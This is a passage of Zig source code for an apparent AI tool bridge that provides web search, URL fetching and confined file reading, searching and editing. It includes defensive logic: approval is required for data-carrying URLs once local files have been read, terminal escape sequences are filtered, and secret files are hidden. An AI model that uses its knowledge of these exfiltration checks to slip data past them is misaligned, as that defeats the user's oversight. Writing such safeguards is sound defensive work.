        const location = response.head.location orelse return .{ .done = try failText(allocator, "error: {s} redirected without a Location", .{url}) };
        if (hops_left == 0) return .{ .done = try failText(allocator, "error: more than {d} redirects from {s}", .{ max_redirects, url }) };
        const next = try resolveUrl(allocator, url, location) orelse
            return .{ .done = try failText(allocator, "refused: {s} redirected to a non-http location", .{url}) };
        return .{ .redirect = next };
    }
    const content_type = try allocator.dupe(u8, response.head.content_type orelse "");
    errdefer allocator.free(content_type);
    const decompress_buffer: []u8 = switch (response.head.content_encoding) {
        .identity => &.{},
        .zstd => try allocator.alloc(u8, std.compress.zstd.default_window_len),
        .deflate, .gzip => try allocator.alloc(u8, std.compress.flate.max_window_len),
        .compress => {
            allocator.free(content_type);
            return .{ .done = try failText(allocator, "error: {s} uses an unsupported compression", .{url}) };
        },
    };
    defer allocator.free(decompress_buffer);
    var transfer_buffer: [64]u8 = undefined;
    var decompress: std.http.Decompress = undefined;
    const reader = response.readerDecompressing(&transfer_buffer, &decompress, decompress_buffer);
    var body = std.ArrayList(u8).empty;
    errdefer body.deinit(allocator);
    var truncated = false;
    reader.appendRemaining(allocator, &body, .limited(max_bytes)) catch |err| switch (err) {
        error.StreamTooLong => truncated = true,
        error.OutOfMemory => return error.OutOfMemory,
        error.ReadFailed => {
            body.deinit(allocator);
            allocator.free(content_type);
            const why = if (response.bodyErr()) |e| @errorName(e) else "read failed";
            return .{ .done = try failText(allocator, "error: reading {s} failed ({s})", .{ url, why }) };
        },
    };
    const final_url = try allocator.dupe(u8, url);
    errdefer allocator.free(final_url);
    return .{ .done = .{ .page = .{
        .status = @backingInt(status),
        .content_type = content_type,
        .body = try body.toOwnedSlice(allocator),
        .url = final_url,
        .truncated = truncated,
    } } };
}

/// GET with every redirect hop re-checked. Errors are OOM or cancelation only.
fn webGetFollow(allocator: std.mem.Allocator, io: std.Io, start_url: []const u8, max_bytes: usize) anyerror!WebResult {
    var client: std.http.Client = .{ .allocator = allocator, .io = io };
    defer client.deinit();
    var url = try allocator.dupe(u8, start_url);
    defer allocator.free(url);
    var hops_left: usize = max_redirects;
    while (true) : (hops_left -= 1) {
        switch (try webHop(&client, allocator, url, max_bytes, hops_left)) {
            .done => |r| return r,
            .redirect => |next| {
                allocator.free(url);
                url = next;
            },
        }
    }
}

/// `webGetFollow` bounded by `fetch_timeout_s` on the wall clock.
fn webGet(ctx: Context, url: []const u8, max_bytes: usize) !WebResult {
    const U = union(enum) { got: anyerror!WebResult, timer: std.Io.Cancelable!void };
    var buf: [2]U = undefined;
    var sel = std.Io.Select(U).init(ctx.io, &buf);
    sel.concurrent(.got, webGetFollow, .{ ctx.allocator, ctx.io, url, max_bytes }) catch
        return webGetFollow(ctx.allocator, ctx.io, url, max_bytes);
    sel.concurrent(.timer, std.Io.sleep, .{ ctx.io, std.Io.Duration.fromSeconds(fetch_timeout_s), .awake }) catch {};
    const first = sel.await() catch |err| {
        while (sel.cancel()) |rest| if (rest == .got) if (rest.got) |r| r.deinit(ctx.allocator) else |_| {};
        return err;
    };
    while (sel.cancel()) |rest| if (rest == .got) if (rest.got) |r| r.deinit(ctx.allocator) else |_| {};
    return switch (first) {
        .got => |r| r,
        .timer => failText(ctx.allocator, "error: {s} did not answer within {d} s", .{ url, fetch_timeout_s }),
    };
}

// ── Tools ───────────────────────────────────────────────────────────────

pub const max_read_bytes = 256 * 1024;
/// One cap for what the file tools can read and what they can write: nothing gets written that
/// the same tools could not read back whole.
pub const max_write_bytes = max_read_bytes;
const max_list_entries = 500;
const max_search_hits = 100;
const max_search_files = 5000;
const max_search_file_bytes = 1024 * 1024;

pub const Context = struct {
    allocator: std.mem.Allocator,
    io: std.Io,
    /// Real path of the folder the file tools stay inside; `/cd` moves it.
    root: [:0]const u8,
    vision: bool,
    /// The user has turned editing on: `write_file` and `edit_file` may change files under `root`.
    writable: bool = false,
};

pub const Output = struct {
    text: []u8,
    /// A data: URL the model should see on its next request.
    image: ?[]u8 = null,

    pub fn deinit(o: Output, allocator: std.mem.Allocator) void {
        allocator.free(o.text);
        if (o.image) |i| allocator.free(i);
    }
};

fn tool(comptime name: []const u8, comptime description: []const u8, comptime properties: []const u8, comptime required: []const u8) []const u8 {
    return "{\"type\":\"function\",\"function\":{\"name\":\"" ++ name ++ "\",\"description\":\"" ++ description ++
        "\",\"parameters\":{\"type\":\"object\",\"properties\":{" ++ properties ++ "},\"required\":[" ++ required ++ "]}}}";
}

const text_tools = tool("web_search", "Search the web with DuckDuckGo. Returns up to 8 results with title, url and snippet.", "\"query\":{\"type\":\"string\",\"description\":\"What to search for\"}", "\"query\"") ++ "," ++
    tool("fetch_url", "Fetch a public http(s) page and return its readable text and image URLs (at most 20000 characters).", "\"url\":{\"type\":\"string\",\"description\":\"The http or https URL\"}", "\"url\"") ++ "," ++
    tool("read_file", "Read a text file inside the current folder.", "\"path\":{\"type\":\"string\",\"description\":\"Path relative to the current folder\"}", "\"path\"") ++ "," ++
    tool("list_dir", "List a folder inside the current folder.", "\"path\":{\"type\":\"string\",\"description\":\"Folder relative to the current folder; default .\"}", "") ++ "," ++
    tool("search_files", "Find lines matching a text or regex pattern in the text files under a folder.", "\"pattern\":{\"type\":\"string\",\"description\":\"Text or regex to find\"},\"path\":{\"type\":\"string\",\"description\":\"Folder to search; default .\"}", "\"pattern\"");

const image_tool = tool("view_image", "Look at an image: a file inside the current folder or a public image URL. To show an online image to the user, include ![description](https://direct-image-url) in your answer.", "\"path_or_url\":{\"type\":\"string\",\"description\":\"Image path or http(s) URL\"}", "\"path_or_url\"");

const write_tools = tool("write_file", "Create a text file in the current folder, or replace one that is already there. Give the whole content at once, up to 262144 bytes.", "\"path\":{\"type\":\"string\",\"description\":\"Path relative to the current folder\"},\"content\":{\"type\":\"string\",\"description\":\"The complete file content\"}", "\"path\",\"content\"") ++ "," ++
    tool("edit_file", "Change a text file in the current folder by replacing old_string with new_string. Read the file first, so old_string matches the stored text exactly. It refuses when old_string matches more than once, unless replace_all is true.", "\"path\":{\"type\":\"string\",\"description\":\"Path relative to the current folder\"},\"old_string\":{\"type\":\"string\",\"description\":\"Exact text to find\"},\"new_string\":{\"type\":\"string\",\"description\":\"Text to put in its place\"},\"replace_all\":{\"type\":\"boolean\",\"description\":\"Replace every match; default false\"}", "\"path\",\"old_string\",\"new_string\"");

/// The OpenAI `tools` array; `view_image` only for a model that sees images, the write tools only
/// when the user turned editing on, so a model never offers a call the bridge would refuse.
pub fn definitionsJson(vision: bool, writable: bool) []const u8 {
    if (vision) return if (writable)
        "[" ++ text_tools ++ "," ++ image_tool ++ "," ++ write_tools ++ "]"
    else
        "[" ++ text_tools ++ "," ++ image_tool ++ "]";
    return if (writable) "[" ++ text_tools ++ "," ++ write_tools ++ "]" else "[" ++ text_tools ++ "]";
}

const tool_name_base = "web_search, fetch_url, read_file, list_dir, search_files";

pub fn toolNames(vision: bool, writable: bool) []const u8 {
    if (vision) return if (writable)
        tool_name_base ++ ", view_image, write_file, edit_file"
    else
        tool_name_base ++ ", view_image";
    return if (writable) tool_name_base ++ ", write_file, edit_file" else tool_name_base;
}

fn stringArg(args: std.json.Value, key: []const u8) ?[]const u8 {
    const v = args.object.get(key) orelse return null;
    return if (v == .string) v.string else null;
}

/// A boolean argument that a model may leave out or send as anything: only `true` counts.
fn boolArg(args: std.json.Value, key: []const u8) bool {
    const v = args.object.get(key) orelse return false;
    return v == .bool and v.bool;
}

/// Filters bytes bound for the user's terminal: text, `\n`, `\t` and valid UTF-8 pass; other control bytes, DEL, C1
/// and whole ESC sequences are dropped. The state spans calls, so an ESC split across stream deltas is still caught.
pub const TermFilter = struct {
    state: enum { text, esc, csi, string } = .text,

    pub fn write(f: *TermFilter, w: *std.Io.Writer, bytes: []const u8) !void {
        var i: usize = 0;
        while (i < bytes.len) {
            const b = bytes[i];
            switch (f.state) {
                .text => {
                    if (b == 0x1b) {
                        f.state = .esc;
                        i += 1;
                    } else if (b < 0x80) {
                        if ((b >= 0x20 and b != 0x7f) or b == '\n' or b == '\t') try w.writeByte(b);
                        i += 1;
                    } else {
                        const n = std.unicode.utf8ByteSequenceLength(b) catch {
                            i += 1;
                            continue;
                        };
                        if (i + n > bytes.len or !std.unicode.utf8ValidateSlice(bytes[i..][0..n])) {
                            i += 1;
                            continue;
                        }
                        // U+0080..U+009F are the C1 controls (CSI, OSC, ...) some terminals still act on.
                        if (b != 0xC2 or bytes[i + 1] >= 0xA0) try w.writeAll(bytes[i..][0..n]);
                        i += n;
                    }
                },
                // The byte that ends an unfinished sequence is handled as text, not swallowed.
                .esc => {
                    if (b >= 0x20 and b <= 0x2f) {
                        i += 1;
                    } else if (b >= 0x30 and b <= 0x7e) {
                        f.state = if (b == '[') .csi else if (std.mem.indexOfScalar(u8, "]PX^_", b) != null) .string else .text;
                        i += 1;
                    } else f.state = .text;
                },
                .csi => switch (b) {
                    0x20...0x3f => i += 1,
                    0x40...0x7e => {
                        f.state = .text;
                        i += 1;
                    },
                    else => f.state = .text,
                },
                .string => switch (b) {
                    0x07 => {
                        f.state = .text;
                        i += 1;
                    },
                    0x1b => {
                        f.state = .esc;
                        i += 1;
                    },
                    '\n' => f.state = .text,
                    else => i += 1,
                },
            }
        }
    }
};

/// `bytes` through a fresh `TermFilter`, owned.
pub fn sanitizeForTerminal(allocator: std.mem.Allocator, bytes: []const u8) ![]u8 {
    var out: std.Io.Writer.Allocating = .init(allocator);
    errdefer out.deinit();
    var f: TermFilter = .{};
    try f.write(&out.writer, bytes);
    return out.toOwnedSlice();
}

/// Longest URL path a `fetch_url` may carry without asking, once file content is in the session.
pub const max_quiet_path = 80;

/// Whether a URL can carry data to its host: a query string or a long path.
pub fn urlCarriesData(url: []const u8) bool {
    const sent = url[0 .. std.mem.indexOfScalar(u8, url, '#') orelse url.len];
    if (std.mem.indexOfScalar(u8, sent, '?') != null) return true;
    const rest = if (std.mem.indexOf(u8, sent, "://")) |i| sent[i + 3 ..] else sent;
    const path = rest[std.mem.indexOfScalar(u8, rest, '/') orelse return false ..];
    return path.len > max_quiet_path;
}

/// The URL (sanitized, owned) the user must approve before `name` runs, or null when the call needs no asking:
/// a `fetch_url` that `urlCarriesData`, after a file tool has returned content in this session.
pub fn fetchNeedingApproval(allocator: std.mem.Allocator, name: []const u8, args_json: []const u8, file_content_seen: bool) !?[]u8 {
    if (!file_content_seen or !std.mem.eql(u8, name, "fetch_url")) return null;
    const parsed = std.json.parseFromSlice(std.json.Value, allocator, args_json, .{}) catch return null;
    defer parsed.deinit();
    if (parsed.value != .object) return null;
    const url = stringArg(parsed.value, "url") orelse return null;
    if (!urlCarriesData(url)) return null;
    return try sanitizeForTerminal(allocator, url);
}

/// Tools whose result is local file content, or that put model content into a local file. Both
/// mean content from this machine is in the session, which is what arms the `fetch_url` approval.
pub fn isFileTool(name: []const u8) bool {
    for ([_][]const u8{ "read_file", "list_dir", "search_files", "view_image", "write_file", "edit_file" }) |n| if (std.mem.eql(u8, n, name)) return true;
    return false;
}

/// The tools that change files, and so need the user's editing switch on top of the file tools.
pub fn isWriteTool(name: []const u8) bool {
    for ([_][]const u8{ "write_file", "edit_file" }) |n| if (std.mem.eql(u8, n, name)) return true;
    return false;
}

/// The one dim line the REPL prints per call, safe to print: the model chose every byte of it.
pub fn traceLine(allocator: std.mem.Allocator, name: []const u8, args_json: []const u8) ![]u8 {
    const raw = try traceLineRaw(allocator, name, args_json);
    defer allocator.free(raw);
    return sanitizeForTerminal(allocator, raw);
}

fn traceLineRaw(allocator: std.mem.Allocator, name: []const u8, args_json: []const u8) ![]u8 {
    const parsed = std.json.parseFromSlice(std.json.Value, allocator, args_json, .{}) catch null;
    defer if (parsed) |p| p.deinit();
    const args: ?std.json.Value = if (parsed) |p| (if (p.value == .object) p.value else null) else null;
    const Label = struct { tool: []const u8, verb: []const u8, key: []const u8 };
    for ([_]Label{
        .{ .tool = "web_search", .verb = "search", .key = "query" },
        .{ .tool = "fetch_url", .verb = "fetch", .key = "url" },
        .{ .tool = "read_file", .verb = "read", .key = "path" },
        .{ .tool = "write_file", .verb = "write", .key = "path" },
        .{ .tool = "edit_file", .verb = "edit", .key = "path" },
        .{ .tool = "list_dir", .verb = "list", .key = "path" },
        .{ .tool = "view_image", .verb = "view", .key = "path_or_url" },
    }) |l| if (std.mem.eql(u8, name, l.tool)) {
        const v = if (args) |a| stringArg(a, l.key) orelse "." else ".";
        return std.fmt.allocPrint(allocator, "{s}: {s}", .{ l.verb, v });
    };
    if (std.mem.eql(u8, name, "search_files")) {
        const pattern = if (args) |a| stringArg(a, "pattern") orelse "" else "";
        const path = if (args) |a| stringArg(a, "path") orelse "." else ".";
        return std.fmt.allocPrint(allocator, "grep: {s} in {s}", .{ pattern, path });
    }
    return std.fmt.allocPrint(allocator, "{s}: {s}", .{ name, args_json });
}

fn textOut(allocator: std.mem.Allocator, comptime fmt: []const u8, args: anytype) !Output {
    return .{ .text = try std.fmt.allocPrint(allocator, fmt, args) };
}

/// Runs one tool call. Every failure is a short result string for the model;
/// only OOM is an error.
pub fn run(ctx: Context, name: []const u8, args_json: []const u8) !Output {
    const a = ctx.allocator;
    const parsed = std.json.parseFromSlice(std.json.Value, a, args_json, .{}) catch null;
    defer if (parsed) |p| p.deinit();
    const args = if (parsed) |p| p.value else std.json.Value{ .null = {} };
    const known = for ([_][]const u8{ "web_search", "fetch_url", "read_file", "list_dir", "search_files", "view_image", "write_file", "edit_file" }) |n| {
        if (std.mem.eql(u8, n, name)) break true;
    } else false;
    if (!known) return textOut(a, "error: unknown tool {s}", .{name});
    if (args != .object) return textOut(a, "error: the arguments are not a JSON object", .{});

    if (std.mem.eql(u8, name, "web_search")) {
        const query = stringArg(args, "query") orelse return textOut(a, "error: web_search needs a \"query\" string", .{});
        return webSearch(ctx, query);
    }
    if (std.mem.eql(u8, name, "fetch_url")) {
        const url = stringArg(args, "url") orelse return textOut(a, "error: fetch_url needs a \"url\" string", .{});
        return fetchUrl(ctx, url);
    }
    if (std.mem.eql(u8, name, "read_file")) {
        const path = stringArg(args, "path") orelse return textOut(a, "error: read_file needs a \"path\" string", .{});
        return readFile(ctx, path);
    }
    if (isWriteTool(name)) {
        if (!ctx.writable) return textOut(a, "{s}", .{refuse_write_off});
        if (std.mem.eql(u8, name, "write_file")) {
            const path = stringArg(args, "path") orelse return textOut(a, "error: write_file needs a \"path\" string", .{});
            const content = stringArg(args, "content") orelse return textOut(a, "error: write_file needs a \"content\" string", .{});
            return writeFileTool(ctx, path, content);
        }
        const path = stringArg(args, "path") orelse return textOut(a, "error: edit_file needs a \"path\" string", .{});
        const old_string = stringArg(args, "old_string") orelse return textOut(a, "error: edit_file needs an \"old_string\" string", .{});
        const new_string = stringArg(args, "new_string") orelse return textOut(a, "error: edit_file needs a \"new_string\" string", .{});
        return editFileTool(ctx, path, old_string, new_string, boolArg(args, "replace_all"));
    }
    if (std.mem.eql(u8, name, "list_dir")) return listDir(ctx, stringArg(args, "path") orelse ".");
    if (std.mem.eql(u8, name, "search_files")) {
        const pattern = stringArg(args, "pattern") orelse return textOut(a, "error: search_files needs a \"pattern\" string", .{});
        if (pattern.len == 0) return textOut(a, "error: search_files needs a non-empty pattern", .{});
        return searchFiles(ctx, pattern, stringArg(args, "path") orelse ".");
    }
    const src = stringArg(args, "path_or_url") orelse return textOut(a, "error: view_image needs a \"path_or_url\" string", .{});
    return viewImage(ctx, src);
}

fn webSearch(ctx: Context, query: []const u8) !Output {
    const a = ctx.allocator;
    var url = std.ArrayList(u8).empty;
    defer url.deinit(a);
    try url.appendSlice(a, "https://html.duckduckgo.com/html/?q=");
    for (query) |ch| {
        if (std.ascii.isAlphanumeric(ch) or ch == '-' or ch == '_' or ch == '.' or ch == '~') {
            try url.append(a, ch);
        } else if (ch == ' ') {
            try url.append(a, '+');
        } else {
            try url.print(a, "%{X:0>2}", .{ch});
        }
    }
    const got = try webGet(ctx, url.items, max_fetch_bytes);
    const page = switch (got) {
        .fail => |f| return .{ .text = f },
        .page => |p| p,
    };
    defer page.deinit(a);
    if (ddgBlocked(page.body))
        return textOut(a, "error: DuckDuckGo answered with a bot check instead of results, so web search is unavailable right now; use fetch_url on a site you know", .{});
    if (page.status != 200) return textOut(a, "error: DuckDuckGo answered HTTP {d}", .{page.status});
    const results = try parseDdgResults(a, page.body);
    defer freeSearchResults(a, results);
    if (results.len == 0) return textOut(a, "no results for \"{s}\"", .{query});
    var out = std.ArrayList(u8).empty;
    errdefer out.deinit(a);
    for (results, 1..) |r, n| {
        try out.print(a, "{d}. {s}\n   {s}\n", .{ n, r.title, r.url });
        if (r.snippet.len > 0) try out.print(a, "   {s}\n", .{r.snippet});
    }
    return .{ .text = try out.toOwnedSlice(a) };
}

fn isHtml(content_type: []const u8, body: []const u8) bool {
    if (std.ascii.findIgnoreCase(content_type, "html") != null) return true;
    if (content_type.len > 0) return false;
    const head = std.mem.trimStart(u8, body[0..@min(body.len, 512)], " \t\r\n");
    return startsWithIgnoreCase(head, "<!doctype html") or startsWithIgnoreCase(head, "<html");
}

fn isText(content_type: []const u8) bool {
    if (startsWithIgnoreCase(content_type, "text/")) return true;
    for ([_][]const u8{ "json", "xml", "javascript", "markdown", "yaml", "toml", "csv" }) |t|
        if (std.ascii.findIgnoreCase(content_type, t) != null) return true;
    return false;
}

fn fetchUrl(ctx: Context, url: []const u8) !Output {
    const a = ctx.allocator;
    const got = try webGet(ctx, url, max_fetch_bytes);
    const page = switch (got) {
        .fail => |f| return .{ .text = f },
        .page => |p| p,
    };
    defer page.deinit(a);
    if (imageMime(page.body) != null or startsWithIgnoreCase(page.content_type, "image/")) {
        if (!ctx.vision) return textOut(a, "error: {s} is an image ({s}) and this model cannot see images", .{ page.url, page.content_type });
        if (page.truncated) return textOut(a, "error: the image at {s} is larger than {d} MB", .{ page.url, max_fetch_bytes / (1024 * 1024) });
        return imageOutput(a, page.body, page.url);
    }
    const status_note: []const u8 = if (page.status >= 400) " (an error page)" else "";
    const text = if (isHtml(page.content_type, page.body))
        try htmlToText(a, page.body, page.url, max_page_chars)
    else if (isText(page.content_type) or page.content_type.len == 0)
        try plainText(a, page.body, max_page_chars)
    else
        return textOut(a, "error: {s} is {s}, not a page this tool can read", .{ page.url, page.content_type });
    defer a.free(text);
    return textOut(a, "URL: {s}\nHTTP {d}{s}\n\n{s}", .{ page.url, page.status, status_note, text });
}

fn plainText(allocator: std.mem.Allocator, body: []const u8, max: usize) ![]u8 {
    if (body.len <= max) return allocator.dupe(u8, body);
    var cut = max;
    while (cut > 0 and body[cut] & 0xC0 == 0x80) cut -= 1;
    return std.mem.concat(allocator, u8, &.{ body[0..cut], "\n[truncated]" });
}

fn looksBinary(bytes: []const u8) bool {
    return std.mem.indexOfScalar(u8, bytes[0..@min(bytes.len, 8192)], 0) != null;
}

fn readFile(ctx: Context, path: []const u8) !Output {
    const a = ctx.allocator;
    const real = switch (try confinePath(a, ctx.io, ctx.root, path)) {
        .refused => |msg| return textOut(a, "{s}", .{msg}),
        .ok => |p| p,
    };
    defer a.free(real);
    const file = std.Io.Dir.openFileAbsolute(ctx.io, real, .{}) catch |err| return textOut(a, "error: cannot open {s} ({t})", .{ path, err });
    defer file.close(ctx.io);
    const st = file.stat(ctx.io) catch |err| return textOut(a, "error: cannot stat {s} ({t})", .{ path, err });
    if (st.kind == .directory) return textOut(a, "error: {s} is a folder; use list_dir", .{path});
    const want: usize = @intCast(@min(st.size, max_read_bytes));
    const buf = try a.alloc(u8, want);
    defer a.free(buf);
    var rbuf: [4096]u8 = undefined;
    var fr = file.reader(ctx.io, &rbuf);
    const n = fr.interface.readSliceShort(buf) catch |err| return textOut(a, "error: reading {s} failed ({t})", .{ path, err });
    const data = buf[0..n];
    if (looksBinary(data)) {
        const hint: []const u8 = if (imageMime(data) != null) "; use view_image" else "";
        return textOut(a, "error: {s} is not a text file{s}", .{ path, hint });
    }
    if (st.size > max_read_bytes)
        return textOut(a, "{s}\n[truncated: showing the first {d} bytes of {d}]", .{ data, max_read_bytes, st.size });
    return .{ .text = try a.dupe(u8, data) };
}

fn listDir(ctx: Context, path: []const u8) !Output {
    const a = ctx.allocator;
    const real = switch (try confinePath(a, ctx.io, ctx.root, path)) {
        .refused => |msg| return textOut(a, "{s}", .{msg}),
        .ok => |p| p,
    };
    defer a.free(real);
    var dir = std.Io.Dir.openDirAbsolute(ctx.io, real, .{ .iterate = true }) catch |err| return textOut(a, "error: cannot open folder {s} ({t})", .{ path, err });
    defer dir.close(ctx.io);
    var names = std.ArrayList([]u8).empty;
    defer {
        for (names.items) |n| a.free(n);
        names.deinit(a);
    }
    var hidden: usize = 0;
    var it = dir.iterate();
    while (it.next(ctx.io) catch null) |entry| {
        if (entry.name.len == 0 or entry.name[0] == '.' or isSecretName(entry.name)) {
            hidden += 1;
            continue;
        }
        if (names.items.len == max_list_entries) break;
        const suffix: []const u8 = switch (entry.kind) {
            .directory => "/",
            .sym_link => "@",
            else => "",
        };
        try names.append(a, try std.mem.concat(a, u8, &.{ entry.name, suffix }));
    }
    std.mem.sort([]u8, names.items, {}, struct {
        fn lt(_: void, x: []u8, y: []u8) bool {
            return std.mem.lessThan(u8, x, y);
        }
    }.lt);
    var out = std.ArrayList(u8).empty;
    errdefer out.deinit(a);
    for (names.items) |n| try out.print(a, "{s}\n", .{n});
    if (names.items.len == 0) try out.appendSlice(a, "(empty)\n");
    if (hidden > 0) try out.print(a, "({d} hidden or protected entries not shown)\n", .{hidden});
    return .{ .text = try out.toOwnedSlice(a) };
}

fn searchFiles(ctx: Context, pattern: []const u8, path: []const u8) !Output {
    const a = ctx.allocator;
    const real = switch (try confinePath(a, ctx.io, ctx.root, path)) {
        .refused => |msg| return textOut(a, "{s}", .{msg}),
        .ok => |p| p,
    };
    defer a.free(real);
    var dir = std.Io.Dir.openDirAbsolute(ctx.io, real, .{ .iterate = true }) catch |err| return textOut(a, "error: cannot open folder {s} ({t})", .{ path, err });
    defer dir.close(ctx.io);

    // A line matches on the literal text, or on the pattern as a regex.
    var regex_arena = std.heap.ArenaAllocator.init(a);
    defer regex_arena.deinit();
    const wrapped = try std.mem.concat(a, u8, &.{ ".*(", pattern, ").*" });
    defer a.free(wrapped);
    const nfa = regex.compile(regex_arena.allocator(), wrapped) catch null;
    var line_arena = std.heap.ArenaAllocator.init(a);
    defer line_arena.deinit();

    const prefix = within(ctx.root, real).?;
    var out = std.ArrayList(u8).empty;
    errdefer out.deinit(a);
    var hits: usize = 0;
    var files: usize = 0;
    var walker = try dir.walkSelectively(a);
    defer walker.deinit();
    walk: while (walker.next(ctx.io) catch null) |entry| {
        if (entry.basename[0] == '.' or isSecretName(entry.basename)) continue;
        switch (entry.kind) {
            .directory => {
                walker.enter(ctx.io, entry) catch {};
                continue;
            },
            .file => {},
            else => continue,
        }
        files += 1;
        if (files > max_search_files) break;
        const data = entry.dir.readFileAlloc(ctx.io, entry.basename, a, .limited(max_search_file_bytes)) catch continue;
        defer a.free(data);
        if (looksBinary(data)) continue;
        var lines = std.mem.splitScalar(u8, data, '\n');
        var line_no: usize = 0;
        while (lines.next()) |line_raw| {
            line_no += 1;
            const line = std.mem.trimEnd(u8, line_raw, "\r");
            var hit = std.mem.indexOf(u8, line, pattern) != null;
            if (!hit and nfa != null) {
                _ = line_arena.reset(.retain_capacity);
                hit = regex.match(line_arena.allocator(), nfa.?, line) catch false;
            }
            if (!hit) continue;
            const shown = line[0..@min(line.len, 200)];
            if (prefix.len > 0) try out.print(a, "{s}/", .{prefix});
            try out.print(a, "{s}:{d}: {s}\n", .{ entry.path, line_no, shown });
            hits += 1;
            if (hits == max_search_hits) {
                try out.print(a, "[stopped at {d} matches]\n", .{max_search_hits});
                break :walk;
            }
        }
    }
    if (hits == 0) {
        out.deinit(a);
        return textOut(a, "no matches for \"{s}\" in {s}", .{ pattern, path });
    }
    return .{ .text = try out.toOwnedSlice(a) };
}

// ── Writing ─────────────────────────────────────────────────────────────

/// Non-overlapping matches of `needle` in `hay`.
fn countMatches(hay: []const u8, needle: []const u8) usize {
    var n: usize = 0;
    var i: usize = 0;
    while (std.mem.indexOfPos(u8, hay, i, needle)) |at| {
        n += 1;
        i = at + needle.len;
    }
    return n;
}

/// `hay` with every match of `needle` (or just the first) replaced by `with`.
fn replaceMatches(allocator: std.mem.Allocator, hay: []const u8, needle: []const u8, with: []const u8, all: bool) ![]u8 {
    var out = std.ArrayList(u8).empty;
    errdefer out.deinit(allocator);
    const want: usize = if (all) std.math.maxInt(usize) else 1;
    var i: usize = 0;
    var done: usize = 0;
    while (done < want) : (done += 1) {
        const at = std.mem.indexOfPos(u8, hay, i, needle) orelse break;
        try out.appendSlice(allocator, hay[i..at]);
        try out.appendSlice(allocator, with);
        i = at + needle.len;
    }
    try out.appendSlice(allocator, hay[i..]);
    return out.toOwnedSlice(allocator);
}

/// Writes `bytes` over `real_target`, a real path already confined to the tools' folder, through a
/// temp file and one rename, so a write that fails partway leaves the original whole. A replaced
/// file keeps its permissions. null on success, else the message for the model.
fn replaceFileBytes(allocator: std.mem.Allocator, io: std.Io, real_target: []const u8, bytes: []const u8) !?[]u8 {
    const parent = std.fs.path.dirname(real_target) orelse
        return try std.fmt.allocPrint(allocator, "error: {s} has no parent folder to write in", .{real_target});
    const base = std.fs.path.basename(real_target);
    var dir = std.Io.Dir.openDirAbsolute(io, parent, .{}) catch |err|
        return try std.fmt.allocPrint(allocator, "error: cannot open the folder of {s} ({t})", .{ base, err });
    defer dir.close(io);
    const old = dir.statFile(io, base, .{}) catch null;
    var staged = dir.createFileAtomic(io, base, .{ .replace = true }) catch |err|
        return try std.fmt.allocPrint(allocator, "error: cannot create {s} ({t})", .{ base, err });
    defer staged.deinit(io);
    if (old) |st| staged.file.setPermissions(io, .fromMode(st.permissions.toMode() & 0o7777)) catch {};
    var wbuf: [8192]u8 = undefined;
    var fw = staged.file.writer(io, &wbuf);
    fw.interface.writeAll(bytes) catch {};
    fw.interface.flush() catch {};
    if (fw.err) |err| return try std.fmt.allocPrint(allocator, "error: writing {s} failed ({t}); the original is unchanged", .{ base, err });
    staged.replace(io) catch |err|
        return try std.fmt.allocPrint(allocator, "error: could not put {s} in place ({t}); the original is unchanged", .{ base, err });
    return null;
}

/// Why the file already at `real` cannot be replaced by a text write: null when nothing is there
/// or what is there is text, else the message for the model.
fn blockedTextOverwrite(ctx: Context, path: []const u8, real: []const u8) !?[]u8 {
    const a = ctx.allocator;
    var file = std.Io.Dir.openFileAbsolute(ctx.io, real, .{}) catch |err| switch (err) {
        error.FileNotFound => return null,
        else => return try std.fmt.allocPrint(a, "error: cannot open {s} ({t})", .{ path, err }),
    };
    defer file.close(ctx.io);
    const st = file.stat(ctx.io) catch |err| return try std.fmt.allocPrint(a, "error: cannot stat {s} ({t})", .{ path, err });
    if (st.kind == .directory) return try std.fmt.allocPrint(a, "error: {s} is a folder; give a file name inside it", .{path});
    const sniff: usize = @intCast(@min(st.size, 8192));
    if (sniff == 0) return null;
    const buf = try a.alloc(u8, sniff);
    defer a.free(buf);
    var rbuf: [4096]u8 = undefined;
    var fr = file.reader(ctx.io, &rbuf);
    const n = fr.interface.readSliceShort(buf) catch |err|
        return try std.fmt.allocPrint(a, "error: reading {s} failed ({t})", .{ path, err });
    if (looksBinary(buf[0..n])) return try std.fmt.allocPrint(a, "refused: {s} is not a text file; write to another name", .{path});
    return null;
}

fn writeFileTool(ctx: Context, path: []const u8, content: []const u8) !Output {
    const a = ctx.allocator;
    if (content.len > max_write_bytes)
        return textOut(a, "error: write_file content is {d} bytes, more than the {d} bytes a file tool can hold", .{ content.len, max_write_bytes });
    const real = switch (try confineWriteTarget(a, ctx.io, ctx.root, path)) {
        .refused => |msg| return textOut(a, "{s}", .{msg}),
        .ok => |p| p,
    };
    defer a.free(real);
    if (try blockedTextOverwrite(ctx, path, real)) |msg| return .{ .text = msg };
    if (try replaceFileBytes(a, ctx.io, real, content)) |msg| return .{ .text = msg };
    return textOut(a, "wrote {d} bytes to {s}", .{ content.len, path });
}

fn editFileTool(ctx: Context, path: []const u8, old_string: []const u8, new_string: []const u8, replace_all: bool) !Output {
    const a = ctx.allocator;
    if (old_string.len == 0) return textOut(a, "error: edit_file needs a non-empty old_string", .{});
    const real = switch (try confinePath(a, ctx.io, ctx.root, path)) {
        .ok => |p| p,
        .refused => |msg| return if (std.mem.eql(u8, msg, refuse_missing))
            textOut(a, "error: {s} has no such file to edit; use write_file to create one", .{path})
        else
            textOut(a, "{s}", .{msg}),
    };
    defer a.free(real);
    var file = std.Io.Dir.openFileAbsolute(ctx.io, real, .{}) catch |err|
        return textOut(a, "error: cannot open {s} ({t})", .{ path, err });
    defer file.close(ctx.io);
    const st = file.stat(ctx.io) catch |err| return textOut(a, "error: cannot stat {s} ({t})", .{ path, err });
    if (st.kind == .directory) return textOut(a, "error: {s} is a folder; edit_file needs a text file", .{path});
    var rbuf: [4096]u8 = undefined;
    var fr = file.reader(ctx.io, &rbuf);
    // Read to the end rather than to the size just stat'ed: a rewrite of a partial read would drop
    // whatever the file had grown by.
    const data = fr.interface.allocRemaining(a, .limited(max_write_bytes)) catch |err| switch (err) {
        error.StreamTooLong => return textOut(a, "error: {s} is over {d} bytes, too large to edit safely; the read tools would only see part of it", .{ path, max_write_bytes }),
        else => return textOut(a, "error: reading {s} failed ({t})", .{ path, err }),
    };
    defer a.free(data);
    if (looksBinary(data)) return textOut(a, "refused: {s} is not a text file", .{path});
    const matches = countMatches(data, old_string);
    if (matches == 0) return textOut(a, "error: no match for old_string in {s}; read the file and copy the exact text", .{path});
    if (matches > 1 and !replace_all)
        return textOut(a, "refused: old_string has {d} matches in {s}; give a longer old_string or set replace_all to true", .{ matches, path });
